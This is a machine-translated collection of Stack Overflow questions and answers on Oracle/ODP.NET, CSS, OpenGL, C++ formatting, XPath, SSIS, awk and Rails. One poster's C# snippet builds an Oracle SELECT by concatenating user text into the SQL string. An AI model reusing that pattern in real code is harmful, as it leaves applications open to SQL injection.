（FWIW，我也希望在上面链接的 Oracle 论坛帖子中以用户“997340”的身份收到对我的帖子的回复。如果我收到有用的回复，我一定会分享这方面的知识。）

**编辑：**如果有帮助，下面是我的代码中失败的两个块。我在对第一个块进行故障排除时创建了第二个块，只是为了看看是否有任何区别。在检查字符串值是否已插入（“if”语句）以及实际插入字符串值（“AddObject”语句）时，我得到了异常。

1：

```
if (!(from q in db.MSG_LOG_MESSAGE where q.MESSAGE == msg select q.MESSAGE).Any())
{
  db.MSG_LOG_MESSAGE.AddObject(new MSG_LOG_MESSAGE { MESSAGE = msg });
  db.SaveChanges();
} 
```

2：

```
if (!db.MSG_LOG_MESSAGE.Any(q => q.MESSAGE == msg))
{
  db.MSG_LOG_MESSAGE.AddObject(new MSG_LOG_MESSAGE { MESSAGE = msg });
  db.SaveChanges();
} 
```

**4月3日更新：**

我能够跟踪从上面第一个代码块中的“if”语句发送到 Oracle 的 SQL。这里是：

```
SELECT
CASE WHEN ( EXISTS (SELECT
        1 AS "C1"
        FROM "SEC"."MSG_LOG_MESSAGE" "Extent1"
        WHERE ("Extent1"."MESSAGE" = :p__linq__0)
)) THEN 1 WHEN ( NOT EXISTS (SELECT
        1 AS "C1"
        FROM "SEC"."MSG_LOG_MESSAGE" "Extent2"
        WHERE ("Extent2"."MESSAGE" = :p__linq__0)
)) THEN 0 END AS "C1"
FROM  ( SELECT 1 FROM DUAL ) "SingleRowTable1" ; 
```

不幸的是，与我合作的 DBA 没有为我提供“p_linq_0”参数的值，但如前所述，当它超过 1,999 个字符时，就会发生异常。（在跟踪这个 SQL 时，我传递了一个 4,000 个字符的字符串作为参数，当然发生了异常。）DBA 还提到了某些 SQL 客户端 - 例如 SQL *Plus - 无法处理超过 2,000 个字符的 VARCHAR2 . 我没有完全遵循。是否使用 SQL*此外，SQL Developer 或任何其他工具，Oracle 仍将查询 4,000 个字符的 VARCHAR2 字段。另外，我的幻数是 1,999 个字符；不是 2,000 个字符。DBA 是否可能意味着参数中可以包含多少个字符？更重要的是，当我在 SQL Developer 中执行此 SQL 并为参数输入一个 4,000 个字符的字符串时，它可以完美运行。所以我仍然对为什么它不能通过 LINQ to Entities 工作感到非常困惑。我还在我的程序中尝试了以下代码，以在“msg”变量中使用 4,000 个字符的字符串运行类似的查询，效果也很好：

```
using Oracle.DataAccess;
using Oracle.DataAccess.Client;
using System.Data;

...

OracleConnection conn = new OracleConnection("Data Source=[MASKED];User Id=[MASKED];Password=[MASKED]");
conn.Open();
OracleCommand cmd = new OracleCommand();
cmd.Connection = conn;
cmd.CommandText = "SELECT message FROM msg_log_message WHERE message = '" + msg + "'";
cmd.CommandType = CommandType.Text;
OracleDataReader dr = cmd.ExecuteReader();
dr.Read();
string result1 = dr.GetString(0);
conn.Dispose(); 
```

现在，我仍然指责 ODAC 存在错误，因为它与 LINQ to Entities 相关......

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-06-26T15:25:50.473

2012 年 9 月的“11.2 Release 5 Production (11.2.0.3.0)”的最新 ODP.NET 文档在“实体框架相关提示、限制和已知问题”部分下陈述了以下已知问题，该文件解决了来自问题代码块中的“if”语句：

> **如果在 LINQ/ESQL 查询的 WHERE 子句中绑定了 2,000 个或更多字符的字符串或长度为 4,000 个字节或更多的字节数组，则会遇到“ORA-00932：不一致的数据类型”错误。**如果在 LINQ/ESQL 查询的 WHERE 子句中使用映射到 BLOB、CLOB、NCLOB、LONG、LONG RAW、XMLTYPE 列的实体属性，则会遇到相同的错误。

较早的 ODP.NET 文档 - 用于 2011 年 5 月的“发布 11.2.0.3.0 生产” - 陈述了相同的已知问题，因此显然这已经是一段时间的已知问题。

上述文档均未提及在问题代码块中的“AddObject”语句中遇到相同的错误，但该问题与提到的 XMLType 字段的另一个已知问题非常相似：

> 尝试将长度等于或大于 2,000 个字符的字符串绑定到 XMLType 列或参数时，将遇到“ORA-00932：不一致的数据类型：预期 - 得到 NCLOB”错误。[错误 12630958]

# oauth - 谁（授权服务器）支持“资源所有者密码凭证”流程？

> ID：15750179
> 
> 赞同：1
> 
> 时间：2013-04-01T19:20:35.720
> 
> 标签：oauth, oauth-2.0

在这里问这个问题可能不好，但即使经过大量调查，我也没有发现哪个公共 api 支持 OAuth 2.0 的“资源所有者密码凭据”流程。

我们正在构建通用 REST 客户端，并想知道是否有此流程的真实示例。

谢谢，拉胡尔

# java - 为什么我的缓冲区在此代码中返回为 null？

> ID：15750182
> 
> 赞同：-1
> 
> 时间：2013-04-01T19:20:46.660
> 
> 标签：java, object, concurrency, locking, nullpointerexception

代码改编自[http://rxtx.qbang.org/wiki/index.php/Event_Based_Two_Way_Communication](http://rxtx.qbang.org/wiki/index.php/Event_Based_Two_Way_Communication)

我正在尝试使用 SerialReader 类读取公共缓冲区并通过 SerialWriter 类通过 Serial 发送该缓冲区，但是每次调用 Writer 时缓冲区都显示为 null 。使用 TwoWaySerialCommTest 的 connect 方法初始化代码（粘贴在下面以供参考）

```
public SerialWriter ( OutputStream out )
            {
                this.out = out;
            }

            public SerialWriter ( OutputStream out, byte[] buffer)
            {
                    this.out = out;
                    this.buffer = buffer;
            }

            public void run ()
            {
                    while(true)
                    {
                            lock.lock();
                            try
                        {
                            dataAvailable.await();
                            System.out.println("Waking up");
                            int i = 0;
                            if (this.buffer != null)
                            {
                                    System.out.println("Buffer isn't empty");
                                    while(buffer[i] != ((byte)'\n') && i < buffer.length - 1)
                                    {
                                            this.out.write(buffer[i]);
                                    }
                            }
                            else
                            {
                                    System.out.println("Buffer is null");
                                    System.out.println(this.buffer.toString());
                            }
                        }
                        catch ( IOException e )
                        {
                            e.printStackTrace();
                            System.exit(-1);
                        }
                        catch(Exception e)
                        {
                            e.printStackTrace();
                        }

                            finally
                            {
                                    lock.unlock();
                            }
                    }
            }
        } 
```

串行阅读器类

```
public static class SerialReader implements SerialPortEventListener
        {
            private InputStream in;
            byte[] buffer;

            public SerialReader ( InputStream in )
            {
                this.in = in;
            }

            public SerialReader (InputStream in, byte[] buffer)
            {
                    this.in = in;
                    this.buffer = buffer;
            }

            public void serialEvent(SerialPortEvent arg0) {
                lock.lock();
                    int data;
                    if (buffer != null)
                    {
                     for(int i = 0; i < buffer.length; i++)
                    {
                            if (buffer[i] != 0)
                            {
                                    System.out.print((char)buffer[i]);
                            }
                    }
                    }
                    buffer = new byte[1024];

                try
                {
                    int len = 0;
                    while ( ( data = in.read()) > -1 )
                    {
                        if ( data == '\n' ) {
                            break;
                        }
                        buffer[len++] = (byte) data;
                    }
                    System.out.println(new String(buffer,0,len));
                    for(int i = 0; i < buffer.length; i++)
                    {
                            if (buffer[i] != 0)
                            {
                                    System.out.print((char)buffer[i]);
                            }
                    }
                    System.out.println();
                    dataAvailable.signal();
                }
                catch ( IOException e )
                {
                    e.printStackTrace();
                    System.exit(-1);
                }
                finally
                {
                    lock.unlock();
                }
            }

        } 
```

TwoWaySerialCommTest（截断）

```
 import gnu.io.SerialPortEvent;
    import gnu.io.SerialPortEventListener;

    import java.io.IOException;
    import java.io.InputStream;
    import java.io.OutputStream;
    import java.util.concurrent.locks.*;

    /**
     * This version of the TwoWaySerialComm example makes use of the
     * SerialPortEventListener to avoid polling.
     *
     */
    public class TwoWaySerialCommTest
    {
            static Lock lock = new ReentrantLock();
            static Condition dataAvailable = lock.newCondition();
            public volatile byte[] buffer;

            public TwoWaySerialCommTest()
        {
            super();
        }

        void connect ( String portName ) throws Exception
        {
            CommPortIdentifier portIdentifier = CommPortIdentifier.getPortIdentifier(portName);
            if ( portIdentifier.isCurrentlyOwned() )
            {
                System.out.println("Error: Port is currently in use");
            }
            else
            {
                CommPort commPort = portIdentifier.open(this.getClass().getName(),2000);

                if ( commPort instanceof SerialPort )
                {
                    SerialPort serialPort = (SerialPort) commPort;
                    serialPort.setSerialPortParams(57600,SerialPort.DATABITS_8,SerialPort.STOPBITS_1,SerialPort.PARITY_NONE);

                    InputStream in = serialPort.getInputStream();
                    OutputStream out = serialPort.getOutputStream();

                    (new Thread(new SerialWriter(out , buffer))).start();

                    serialPort.addEventListener(new SerialReader(in , buffer));
                    serialPort.notifyOnDataAvailable(true);

                }
                else
                {
                    System.out.println("Error: Only serial ports are handled by this example.");
                }
            }
        } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:25:21.773

一个问题似乎是这一行：

```
buffer = new byte[1024]; 
```

我认为您不想将本地分配给`buffer`那里的新字节数组。这会导致写入器写入自己的数组，而*不是*读取器共享的传入数组。分配`buffer`only 会影响 writer 内部的局部变量。

另外，是什么阻止输入流覆盖`buffer`？如果行长超过 1024，你将得到一个数组越界异常。

最后，您没有将`\n`字符写入`buffer`. 所以读者将在输出中打印一些`\0`空字符。

# html - css标签栏高度问题

> ID：15750186
> 
> 赞同：1
> 
> 时间：2013-04-01T19:20:55.003
> 
> 标签：html, css

我尝试在悬停状态下实现一个带有额外填充的标签栏。但问题在于悬停状态实际上它移动了父 div。

你可以看到下面的html；

```
<div id="statNav">
        <a href="#">Gogus</a>
        <a href="#">Kol</a>
        <a href="#">Gogus</a>
        <a href="#">Gogus</a>
        <a href="#">Gogus</a>
        <a href="#">Omuz</a>
        <a href="#">Gogus</a>
</div> 
```

和CSS；

```
#statNav{
    width:100%;
    border-bottom:2px solid #9B2F2C;
    overflow:auto;
}

#statNav a{
    float:left;
    background-color:#333333;
    color:white;
    font-size:12px;
    font-weight:bold;
    text-align:center;
    width:62px;
    padding-top: 5px;
    padding-bottom:5px;
    border-right: 1px solid #777777;
}

#statNav a:first-child{

    -webkit-border-radius: 5px 0px 0px 0px;
    border-radius: 5px 0px 0px 0px;
}

#statNav a:last-child{

    -webkit-border-radius: 0px 5px 0px 0px;
    border-radius: 0px 5px 0px 0px;
    border-right:none;
    width:63px;
}

#statNav a:hover{

    -webkit-border-radius: 5px 5px 0px 0px;
    border-radius: 5px 5px 0px 0px;
    background-color:#9B2F2C;
    padding-top: 15px;
} 
```

这是工作样本；

[http://jsfiddle.net/Kg3p4/](http://jsfiddle.net/Kg3p4/)

我该如何解决？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:27:54.940

您可以通过在非悬停选项卡上使用边距并在悬停时将其删除以应对增加的填充大小来解决此问题。请注意，边距的大小等于悬停和非悬停填充之间的差异。

```
#statNav a{
    margin-top: 10px;
    padding-top: 5px;
}
#statNav a:hover{
    margin-top: 0;
    padding-top: 15px;
} 
```

我已经用这个解决方案的[简单演示](http://jsfiddle.net/Kg3p4/7/)更新了你的 jsFiddle 。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T19:26:52.933

您可以通过添加等于填充差异的负边距底部来稍微修改悬停状态。像这样的东西：

```
#statNav a:hover{

    -webkit-border-radius: 5px 5px 0px 0px;
    border-radius: 5px 5px 0px 0px;
    background-color:#9B2F2C;
    padding-top: 10px;
    margin-bottom: -5px;
} 
```

[http://jsfiddle.net/Kg3p4/5/](http://jsfiddle.net/Kg3p4/5/)

# c++ - OpenGL 4x 中多光片段着色器的打包数据

> ID：15750188
> 
> 赞同：0
> 
> 时间：2013-04-01T19:21:05.490
> 
> 标签：c++, opengl, glsl

我有一个用 C++ 和 OpenGL 4.x 编写的 3d 渲染器我有一个工作正常的前向照明系统。但我认为如何优化它，因为我相信我的瓶颈是我在客户端打包灯光参数的方式。

在片段着色器中，我有一个 Light 结构数组，如下所示：

```
 #define numLights 10;
 struct Light {
   int  lightType;
   vec4 position;
   vec4 ambient;
   vec4 diffuse;
   vec4 specular;

 };
uniform Light lights[numLights]; 
```

假设我在场景中有 10 盏灯，所以我有一个方法可以填充上面的数组并将其发送到着色器程序：

```
 void LightCollector:: UpdateLights(const GLuint& program)const{
    size_t vecSize =_lights.size();
    for(size_t i = 0; i <vecSize; ++i) {
        if(!_lights[i]->lightDirty) continue;
        //  set struct array of each light props here
        std::string lt=std::string("lights[") + boost::lexical_cast<std::string>(i) + "].lightType";
        glUniform1i(glGetUniformLocation(program,lt.c_str ),DIR_LIGHT);
                  ..............
                  ...................
                  ........................
                  ... the same goes for each Light prop in the struct

       _lights[i]->lightDirty=false;
    }
 } 
```

正如人们所看到的，我必须进行字符串连接和数字到字符串的转换，这可能会增加一些开销。有没有更有效的方法将此数据传递给着色器？

# c++ - 从二进制文件读取双精度（进入类） - 不显示小数

> ID：15750190
> 
> 赞同：2
> 
> 时间：2013-04-01T19:21:13.767
> 
> 标签：c++

读取数据后无法显示小数。

正如标题所说..这里有一些代码片段。

学生 obj 的标题

```
class StudentRecordData
{
protected:
   double Marks[MAX_COURSES];
   unsigned int Age;
   unsigned int ID;
   unsigned int CourseCount;
   char FirstName[LEN_FN];
   char LastName[LEN_FN];
   Course  Courses[MAX_COURSES];
}; 
```

学生头：

```
class Student : public StudentRecordData {

public:
    double *getMarks();
    unsigned int getAge();
    unsigned int getID();
    unsigned int getCourseCount();
    char *getFirstName();
    char *getLastName();
    Course *getCourses();
    double getAverage();

    int operator < (Student &);
    int operator < (const char &);
}; 
```

学生实现（继承上述）

```
#include "Student.h"
#include <iostream>
#include <cstring>
using namespace std;

double *Student::getMarks() {
    return Marks;
}

unsigned int Student::getAge() {
    return Age;
}

unsigned int Student::getID() {
    return ID;
}

unsigned int Student::getCourseCount() {
    return CourseCount;
}

char *Student::getFirstName() {
    return FirstName;
}

char *Student::getLastName() {
    return LastName;
}

Course *Student::getCourses() {
    return Courses;
}

int Student::operator<(Student &s) {
    int ret = 0;

    int LNRet = strcmp(this->getLastName(), s.getLastName());
    int FNRet = strcmp(this->getFirstName(), s.getFirstName());

    if (LNRet < 0) {
        ret = 1;
    } else if (LNRet == 0) {
        if (FNRet < 0) {
            ret = 1;
        }
    }

    return ret;
}

int Student::operator<(const char &s) {
    cout << "in char *!" << endl;
    int ret = 0;

    return ret;
}

double Student::getAverage() {
    double total = 0.00;
    for (int i = 0; i < (getCourseCount()); i++) {
        total = total + getMarks()[i];
    }
    return total / getCourseCount();
} 
```

主要的

```
#include "Course.h"
#include "Student.h"
#include "Node.h"
#include "LinkedList.h"
#include <iostream>
#include <fstream>
#include <iomanip>
using namespace std;

int main(void) {
    char input[] = "OOP344.dat";
    char output[] = "OUTPUT.txt";
    Student student;
    LinkedList list;
    Node *node;

    // read in file
    ifstream ifile(input, ios::binary);
    while (!ifile.eof()) {
        ifile.read(reinterpret_cast<char *>(&student), sizeof(Student));

        node = new Node(student);
        list.addNode(node);
    }
    ifile.close();

    list.sort();

    // write to file
    ofstream ofile(output);
    if (ofile.is_open()) {

        for (node = list.getFirstNode(); node; node = list.getNextNode(node)) {
            cout << setw(10) << "Last Name" << setw(12) << "First Name" << setw(5) << "Age" << setw(12) << "Student ID" <<
                    setw(15) << "Course"    << setw(7) << "Mark" << endl;
            cout << setw(10) << "=========" << setw(12) << "==========" << setw(5) << "===" << setw(12) << "==========" <<
                    setw(15) << "======"    << setw(7) << "=====" << endl;
            cout << setw(10) << node->getValue().getLastName()
                 << setw(12) << node->getValue().getFirstName()
                 << setw(5) << node->getValue().getAge()
                 << setw(12) << node->getValue().getID()
                 << setw(22) << node->getValue().getAverage()
                 << endl;

                    int sem, sem_prev;

                    for (int i = 0; i < node->getValue().getCourseCount(); i++) {
                        sem = (int)node->getValue().getCourses()[i].Semester;
                        sem_prev = (int)node->getValue().getCourses()[i-1].Semester;

                        if (!(sem == sem_prev)) {
                            cout << setw(45) << "Sem " << (int)node->getValue().getCourses()[i].Semester << ":"
                                 << setw(7) << node->getValue().getCourses()[i].Name
                                 << setw(7) << setprecision(4) << node->getValue().getMarks()[i] << endl;
                        } else {
                            cout << setw(54) << node->getValue().getCourses()[i].Name
                                 << setw(7) << setprecision(4) << node->getValue().getMarks()[i] << endl;
                        }

                    }

                     cout << endl;
        }
    }
    ofile.close();

    return (0);
} 
```

输出：

```
Last Name  First Name  Age  Student ID         Course   Mark
 =========  ==========  ===  ==========         ======  =====
   Sakedad        Roya   25      486503                 74.31
                                         Sem 1: APC100     69
                                                EAC150     92
                                                ICA002     76
                                                IOS110     87
                                                IPC144     99
                                         Sem 2: ULI101     62
                                                DBS201     66
                                                IBC233     94
                                                INT222     58
                                                OOP244     67
                                         Sem 3: DBS301     61
                                                INT322     89
                                                SYS366     52
                                                BAC344     80
                                                OOP344     63
                                         Sem 4: DCN455     74 
```

问题出在靠近底部的这条线上。它不会显示任何小数点。任何帮助是极大的赞赏。

```
 setprecision(4) << node->getValue().getMarks()[i] 
```

我可以提供任何其他可能有用的文件。我只是希望我的错误主要在某个地方。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T20:10:26.510

你给了我们很多代码来解决一个简单的格式化问题，但我看不出你在哪里告诉输出流你希望浮点值如何格式化。定义了默认格式，以便它会导致所有可能值的可读性，但实际上，对于任何特定的值集（可能在日志文件中或用于序列化目的除外），它永远不是您想要的。在您的情况下（以及在许多较小的程序中），您可能只需将浮点格式设置为固定即可：

```
ofile.setf( std::ios_base::fixed, std::ios_base::floatfield ); 
```

更一般地说，最佳实践是为您需要的不同语义值定义一个操纵器：例如：

```
std::ostream&
mark( std::ostream& dest )
{
    dest.setf( std::ios_base::fixed, std::ios_base::floatfield );
    dest.precision( 2 );
    return dest;
} 
```

然后你可以简单地写：

```
ofile << ... << mark << node->getValue().getMarks()[i] << ... 
```

但是请注意，格式选项和精度都是粘性的；它们将保持设置直到更改。在任何重要的代码中，将它们重置为之前的状态都是一个好习惯。

# forms - xpath - 如何选择这个提交按钮？

> ID：15750191
> 
> 赞同：4
> 
> 时间：2013-04-01T19:21:16.193
> 
> 标签：forms, xpath, form-submit

如何选择此提交按钮？

```
<li id="district_schedule_set_submit_action" class="action input_action ">
  <input class="sexybutton sexysimple sexyorange" type="submit" value="Generate Schedules" name="commit"></input>
</li> 
```

什么没用...

```
//input[value()='Generate Schedules'
//form[input()='Generate Schedules']
//input(text(),'Generate Schedules'))
//input[text(),'Generate Schedules')] 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-01T19:22:40.323

我相信

```
//input[@value="Generate Schedules"] 
```

将工作

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2016-03-17T11:34:12.087

另外的选择：`//input[@type='submit']`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-04-01T20:20:54.937

```
//input[@value='Generate Schedules'] 
```

会起作用（不确定它是否喜欢双引号）。如果要匹配确切的文本，请使用 = 符号。如果您尝试匹配部分文本，请使用包含在逗号中的逗号：

```
//input[contains(@value,'Generate')] 
```

# java - 如何从java中的数组中删除重复的单词

> ID：15750201
> 
> 赞同：1
> 
> 时间：2013-04-01T19:21:51.847
> 
> 标签：java, arrays, duplicates

我正在读取一个文件，然后调用一个 string[] 方法，该方法将行分解为单个单词，将每个单词添加到唯一单词数组（无重复单词）中，并返回唯一单词数组。

我不知道如何只打印每个单词一次，但这是我到目前为止所拥有的。

```
static public String[ ] sortUnique( String [ ] unique, int count)
{
    String temp;
    for(int i = 1; i < count; i++) {
        temp = unique[i].replaceAll("([a-z]+)[,.?]*", "$1");;
        int j;
        for(j = i - 1; j>= 0 && (temp.compareToIgnoreCase(unique[j]) < 0);j--) {
            unique[j+1] = unique[j];
        }
        unique[j+1] = temp;
    }
    return unique;
} 
```

这是数据文件。

```
 Is this a dagger which I see before me,
    The handle toward my hand? Come, let me clutch thee.
    I have thee not, and yet I see thee still.
    Art thou not, fatal vision, sensible
    To feeling as to sight? Or art thou but
    A dagger of the mind, a false creation, 
```

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-01T19:32:21.300

要读取文件并删除重复的单词：

```
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.StreamTokenizer;
import java.util.Set;
import java.util.TreeSet;

public class WordReader {

   public static void main( String[] args ) throws Exception {
      BufferedReader br =
         new BufferedReader(
            new FileReader( "F:/docs/Notes/Notes.txt" ));
      Set< String > words = new TreeSet<>();                // {sorted,unique}
      StreamTokenizer st = new StreamTokenizer( br );
      while( st.nextToken() != StreamTokenizer.TT_EOF ) {
         if( st.ttype == StreamTokenizer.TT_WORD ) {
            words.add( st.sval );
         }
      }
      System.out.println( words );
      br.close();
   }
} 
```

# sql-server - 在ssis中执行sql任务映射变量

> ID：15750205
> 
> 赞同：1
> 
> 时间：2013-04-01T19:22:06.830
> 
> 标签：sql-server, ssis

```
INSERT INTO [DEV_BI].dbo.[DimAktivitet]([Beskrivning],[företag],[Projektnummer],[Aktivitet],
            loaddate)
SELECT NULL,
       a.DATAAREAID,
       a.PROJID,
       a.MID_ACTIVITYNUMBER,
       GETDATE()
FROM [?].dbo.[v_ProjCostTrans_ProjEmplTrans] a
LEFT OUTER JOIN [DEV_BI] .dbo.[DimAktivitet] b ON a.MID_ACTIVITYNUMBER = b.Aktivitet
AND a.DataAreaID = b.företag
AND a.ProjID = b.Projektnummer
WHERE b.Aktivitet_key IS NULL 
```

我在执行 sql 任务和参数映射中有上面的 sql 代码，我映射了一个名为 user::connectionstring 的变量，数据类型为 nvarchar ，参数名称 = 0。我收到以下错误。

> [执行 SQL 任务] 错误：执行查询“插入 [DEV_BI].dbo.[Dimaktivitet]([Beskrivni...”失败，出现以下错误：“无效的对象名称 '?.dbo.v_ProjCostTrans_ProjEmplTrans'。”。可能失败原因：查询有问题，“ResultSet”属性设置不正确，参数设置不正确，或者连接没有正确建立。

请有人帮我解决这个问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:48:29.453

It appears you are trying to change the database based on a variable. The Execute SQL Task can only use parameters as filters in the WHERE clause. This behavior is described in [this TechNet article](http://technet.microsoft.com/en-us/library/ms140355.aspx). For instance, you could do this:

```
insert into [DEV_BI].dbo.[DimAktivitet]([Beskrivning],[företag],[Projektnummer],[Aktivitet],loaddate)  
select null,a.DATAAREAID,a.PROJID,a.MID_ACTIVITYNUMBER,GETDATE() from 
[DEV_BI].dbo.[v_ProjCostTrans_ProjEmplTrans] a 
left outer join 
[DEV_BI] .dbo.[DimAktivitet] b
on a.MID_ACTIVITYNUMBER = b.Aktivitet AND a.DataAreaID = b.företag AND a.ProjID = b.Projektnummer
where b.Aktivitet_key is null
AND b.SomeFilterCriteria = ?; 
```

If you really want to vary the database based on a variable, then you have three options:

1.  Vary the Connection Manager connection string to your database connection based on an expression as described [in a blog post](http://kevine323.blogspot.com/2012/04/dynamic-connection-strings-in-ssis.html). This is the best solution if you are only changing the database and nothing else.

2.  Generate the entire SQL code as a variable and execute a variable as the SQL command instead of passing variables to the Execute SQL Command. This is described [in this blog post](http://www.sqlis.com/sqlis/post/The-Execute-SQL-Task.aspx) under the section "Passing in the SQL Statement from a Variable".

3.  Create a stored procedure, pass the parameter to the stored procedure, and let it generate the SQL it needs on the fly.

# objective-c - 是否有用于引用库中代码的传统 URI 方案？

> ID：15750207
> 
> 赞同：2
> 
> 时间：2013-04-01T19:22:23.503
> 
> 标签：objective-c, dll, shared-libraries, uri, uri-scheme

是否有标准或传统的 URI 方案，例如`file:`或`http:`用于引用动态库中的对象？

例如，如果我要以唯一字符串的形式表示库中的一个函数，该字符串可用于查找该函数（通过任何反射方式），我该怎么做？

具体来说，我正在用 Objective-C 开发它，并且我假设不同的语言/平台会有不同的表示形式（我知道 .NET 有自己的表示形式），但我对这个更普遍的意义感到好奇。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T11:21:54.550

不，符号的名称源自代码中的名称。在 Windows 中，您将假设 C 或 C++

```
HMODULE module=LoadLibrary( [path to your dll] );
//If the exported name is foo.
Function foo=(Function)GetProcAddress(module,"foo");
//Call function
foo();
FreeLibrary(module); 
```

导出的名称取决于编译器。

实际上，这样的命名方案是毫无用处的。在 C++ 中，您*可以*使用类似的东西（请注意，每个函数原型都有一个 FunctionCaller）

```
FunctionCaller("your-dll.dll/foo")(); 
```

FunctionCaller 的构造函数在哪里加载库，调用 foo 并释放库。然而这并不好，因为：

*   返回值可能会指向库内的资源，然后将变得无用

*   加载库和执行函数查找相对于调用找到的函数很慢

你所做的是

1.  加载库

2.  加载您需要的函数

3.  使用你的功能

4.  释放图书馆

在这里，您需要一次引用多个符号，这需要比 uri 更复杂的方案。

编辑：如果您想方便地调用这样的函数，您可以拥有一个幸存的 FunctionCaller 对象，该对象保留所有加载的模块，并包含从函数名称到每个加载库的地址的映射。

# php - 某种 PHP 简码

> ID：15750217
> 
> 赞同：-1
> 
> 时间：2013-04-01T19:23:02.617
> 
> 标签：php

我看到一些 PHP 框架使用了它.. 但我不知道如何完成.. 或如何制作它。

基本上它是一个被调用的函数（我认为）。这是它的样子

```
{name} or {{name}} 
```

怎么可能在 PHP 中做这样的事情？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:24:57.973

这看起来像[Mustache](http://mustache.github.com/)模板语法，PHP 实现的[源代码](https://github.com/bobthecow/mustache.php)是可用的。

# php - 将用户输入显示为外语

> ID：15750226
> 
> 赞同：0
> 
> 时间：2013-04-01T19:23:28.293
> 
> 标签：php, html, security, xss

我最近遇到了一个我没想到的问题。到目前为止，我使用 htmlentites() 来防止 XSS 攻击。我不让它成为用户输入 html 的选项，因此它可以完美运行，除非外国用户想要使用系统，并且 htmlentites() 将他们的字母显示为乱码。

我使用了与所见即所得编辑器一起使用的 HTML 净化器类来防止 XSS，但它是一个完整的类，它确实可以提高性能，而且我真的不必担心允许某些 html 而阻止其他人，因为 html不是问题，只是特殊字符。如果必须，我会使用一个，但我想知道是否有内置的 php 函数用于转义 html 字符，但显示外语。我想他们必须是，因为 PHP 不仅被说英语的人使用。

谢谢！

# c# - 数组列表的数组列表...在c#中

> ID：15750227
> 
> 赞同：-1
> 
> 时间：2013-04-01T19:23:30.373
> 
> 标签：c#, arraylist

我需要从 SQL 查询中获取数据，我有一个方法可以返回数组列表的数组列表，但我无法向我显示查询 sql 返回的数据。

我写的方法返回sql查询：

```
public ArrayList ejecutarSelect(string sentenciaSQL){

    if (this.conn.State != System.Data.ConnectionState.Open)this.Conectar();

    ArrayList rows = new ArrayList();
    MySqlCommand cmd = new MySqlCommand(sentenciaSQL, this.conn);
    try
    {
        MySqlDataReader dataReader = cmd.ExecuteReader();
        if (dataReader.HasRows)
        {
            while (dataReader.Read())
            {
                ArrayList row = new ArrayList();
                for (int i = 0; i < dataReader.FieldCount; i++) row.Add(dataReader.GetString(i));
                rows.Add(row);
            }
        }
        dataReader.Close();
    }
    catch (Exception e)
    {
        CLog.log("ERROR (CDBMgr): " + e.Message);
        return null;
    }

    return rows;
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:02:08.857

```
row.Add(dataReader[i].ToString()); 
```

请参阅[SqlDataReader.GetString 方法](http://msdn.microsoft.com/en-us/library/007ek5d0.aspx)。

它说

> 不执行任何转换；因此，检索到的数据必须已经是一个字符串。

所以 ..

# awk - 查找双引号值并使用 awk 打印它们

> ID：15750229
> 
> 赞同：0
> 
> 时间：2013-04-01T19:23:40.213
> 
> 标签：awk

我有一个包含 1000 行的文件

例如：

```
chr1        Cufflinks        transcript        34611        36081        1000        -        .        gene_id "FAM138A"; transcript_id "uc001aak.3"; FPKM "1.2028600217"; frac "1.000000"; conf_lo "0.735264"; conf_hi "1.670456"; cov "0.978610"; 
```

我想搜索文件并提取字符串之后的值`FPKM`，比如

```
"1.2028600217" 
```

我可以使用它`awk`吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T19:27:15.777

如果您不关心`FPKM`显示在哪一列，您可以：

```
grep -Po '(?<=FPKM )"[^"]*"' file 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T19:28:35.487

您可以使用 awk，但这是单行的简单替换，因此 sed 更适合：

```
$ cat file
chr1 Cufflinks transcript 34611 36081 1000 - . gene_id "FAM138A"; transcript_id "uc001aak.3"; FPKM "1.2028600217"; frac "1.000000"; conf_lo "0.735264"; conf_hi "1.670456"; cov "0.978610";
$ sed 's/.*FPKM *"\([^"]*\)".*/\1/' file
1.2028600217 
```

# sql - Ruby ActiveRecord 和 sql 元组支持

> ID：15750234
> 
> 赞同：7
> 
> 时间：2013-04-01T19:23:59.107
> 
> 标签：sql, ruby, rails-activerecord

假设底层数据库支持，ActiveRecord 是否支持 where 子句中的元组？

生成的 where 子句类似于：

```
where (name, address) in (('John', '123 Main St')) 
```

我试过了：

```
Person.where({[:name, :address] => ['John', '123 Main St']}) 
```

它没有用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2015-07-17T21:56:19.617

```
tupleArray = [['John', '123 Main St'],['Jane', '124 Main St']]
Person.where("(name, address) IN (#{(['(?)']*tupleArray.size).join(', ')})", *tupleArray) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-08T06:23:44.223

```
Person.where("(name, address) IN ((?))", ['John', '123 Main St']) 
```

# url - CakePHP 路由帮助。默认为另一条路线

> ID：15750240
> 
> 赞同：0
> 
> 时间：2013-04-01T19:24:14.113
> 
> 标签：url, cakephp, routing

我正在尝试实现一个自定义路由来捕获这个 url

www.site.com/username

```
Router::connect ('/:username/*', 
array ('controller'=>'users', 'action'=>'view'),
array ('pass'=> array ('username')  
)); 
```

但是如果找不到用户，请应用我的默认项目路由并且不会出现错误。

我有一堆控制器和动作，如果我设置以前的路线，恐怕它们都会停止工作？？

我的意思是，我怎样才能使用所有默认控制器，例如：

```
www.site.com/admin/
www.site.com/users/edit/15
www.site.com/pages/help 
```

等，同时能够有一个自定义路线，如

```
www.site.com/:username 
```

任何帮助或建议将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T21:38:18.447

您可以创建一个自定义路由类来执行解析器。

